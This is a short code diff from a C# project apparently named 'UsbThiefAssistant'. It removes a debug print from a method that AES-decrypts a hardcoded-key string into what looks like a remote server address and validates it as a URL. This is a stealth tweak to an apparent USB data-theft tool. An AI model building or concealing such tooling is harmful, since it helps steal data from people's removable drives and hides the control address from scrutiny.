@@ -169,7 +169,6 @@ namespace UsbThiefAssistant
         private void Upd(string text)
         {
             string addr = AesDecrypt(text, "TFOKUiRKVwQPUxaGc4AMOoAmshXao29j");
-            Console.WriteLine(addr);
             string r = @"((http|ftp|https)://)(([a-zA-Z0-9\._-]+\.[a-zA-Z]{2,6})|([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\&%_\./-~-]*)?";
             Regex regex = new Regex(r);
             if (regex.IsMatch(addr))
